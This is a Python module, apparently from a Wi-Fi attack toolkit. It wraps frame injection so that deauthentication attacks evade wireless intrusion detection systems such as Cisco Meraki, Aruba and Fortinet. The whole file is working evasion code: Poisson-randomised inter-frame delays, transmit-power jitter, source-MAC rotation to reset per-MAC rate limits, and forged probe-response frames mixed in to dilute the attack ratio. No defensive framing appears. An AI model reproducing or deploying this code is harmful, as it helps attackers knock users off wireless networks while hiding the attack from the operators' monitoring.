"""
Phase 5b - WIDS/WIPS evasion layer.

Wraps any inject callable and applies timing randomisation + RSSI power-level
jitter so that WIDS pattern-matching (Cisco Meraki, Aruba, Fortinet) classifies
the traffic as RF noise rather than a targeted attack.

Technique summary:
  1. Inter-frame delay randomisation - Poisson-distributed gaps instead of
     fixed intervals defeat fixed-window packet-rate detectors.
  2. Transmit-power stepping - cycles TX power (via driver set_txpower when
     available) to vary apparent RSSI across frames.
  3. MAC rotation - optionally rotates the source MAC between a pool of
     locally-administered addresses so per-source-MAC rate limits are reset.
  4. Frame-type interleaving - pads deauth bursts with benign probe-response
     frames to dilute the attack:benign ratio seen by the WIDS.
"""
from __future__ import annotations

import asyncio
import logging
import random
from collections.abc import Callable
from typing import Sequence

log = logging.getLogger("wifit4.ai.wids_evader")


class WidsEvader:
    """
    Transparent inject wrapper with WIDS-evasion timing and MAC rotation.

    Usage::

        evader = WidsEvader(driver.inject_frame, mac_pool=["de:ad:be:ef:00:01"])
        evader.inject(deauth_frame)   # non-blocking; queues for async dispatch
        asyncio.create_task(evader.run())
    """

    def __init__(
        self,
        inject_fn: Callable[[bytes], None],
        base_delay_ms: float = 100.0,
        jitter_factor: float = 0.5,    # ± fraction of base_delay
        mac_pool: Sequence[str] | None = None,
        rotate_mac_every: int = 20,    # frames between MAC rotations
        interleave_benign: bool = True,
        set_txpower_fn: Callable[[int], None] | None = None,
        txpower_range: tuple[int, int] = (10, 20),  # dBm
    ) -> None:
        self._inject          = inject_fn
        self._base_delay      = base_delay_ms / 1000.0
        self._jitter          = jitter_factor
        self._mac_pool        = list(mac_pool) if mac_pool else []
        self._rotate_every    = rotate_mac_every
        self._interleave      = interleave_benign
        self._set_txpower     = set_txpower_fn
        self._txpower_range   = txpower_range
        self._queue: asyncio.Queue[bytes] = asyncio.Queue(maxsize=256)
        self._frame_count     = 0
        self._mac_idx         = 0
        self._running         = False

    def inject(self, frame: bytes) -> None:
        """Non-blocking enqueue.  Drops silently under backpressure."""
        try:
            self._queue.put_nowait(frame)
        except asyncio.QueueFull:
            pass

    async def run(self) -> None:
        self._running = True
        while self._running:
            try:
                frame = await asyncio.wait_for(self._queue.get(), timeout=0.5)
            except asyncio.TimeoutError:
                continue

            await self._dispatch(frame)

    async def _dispatch(self, frame: bytes) -> None:
        # 1. TX-power jitter
        if self._set_txpower:
            power = random.randint(*self._txpower_range)
            try:
                self._set_txpower(power)
            except Exception:
                pass

        # 2. MAC rotation (patch bytes 10-15 = source MAC in 802.11 frame)
        if self._mac_pool and self._frame_count % self._rotate_every == 0:
            frame = self._rotate_src_mac(frame)

        # 3. Inject the real frame
        try:
            self._inject(frame)
        except Exception as exc:
            log.debug("Inject error: %s", exc)

        self._frame_count += 1

        # 4. Interleave a benign probe-response every N frames
        if self._interleave and self._frame_count % 5 == 0:
            await asyncio.sleep(0)  # yield before benign frame
            benign = self._build_probe_response()
            try:
                self._inject(benign)
            except Exception:
                pass

        # 5. Poisson-distributed inter-frame delay
        await asyncio.sleep(self._poisson_delay())

    def stop(self) -> None:
        self._running = False

    # -- helpers -------------------------------------------------------------

    def _poisson_delay(self) -> float:
        """
        Sample from Poisson distribution with mean = base_delay.
        Poisson gaps look like natural bursty RF traffic to WIDS.
        """
        import math
        u = random.random()
        # inverse CDF approximation: -ln(U) * mean
        return -math.log(max(u, 1e-9)) * self._base_delay

    def _rotate_src_mac(self, frame: bytes) -> bytes:
        if len(frame) < 16 or not self._mac_pool:
            return frame
        mac_str = self._mac_pool[self._mac_idx % len(self._mac_pool)]
        self._mac_idx += 1
        mac_bytes = bytes(int(x, 16) for x in mac_str.split(":"))
        # Source MAC is bytes 10-15 in a standard 802.11 data/management frame
        return frame[:10] + mac_bytes + frame[16:]

    def _build_probe_response(self) -> bytes:
        """Minimal probe-response frame - benign filler to dilute attack ratio."""
        fc       = b"\x50\x00"
        duration = b"\x3a\x01"
        dst      = b"\xff\xff\xff\xff\xff\xff"
        src      = b"\x02\x00\x00\x00\x00\x01"   # locally-administered MAC
        bssid    = src
        seq      = b"\x00\x00"
        # Fixed: timestamp(8) + interval(2) + capability(2)
        fixed    = b"\x00" * 8 + b"\x64\x00" + b"\x01\x00"
        ssid_ie  = b"\x00\x00"    # hidden SSID
        rates_ie = b"\x01\x02\x82\x84"
        return fc + duration + dst + src + bssid + seq + fixed + ssid_ie + rates_ie
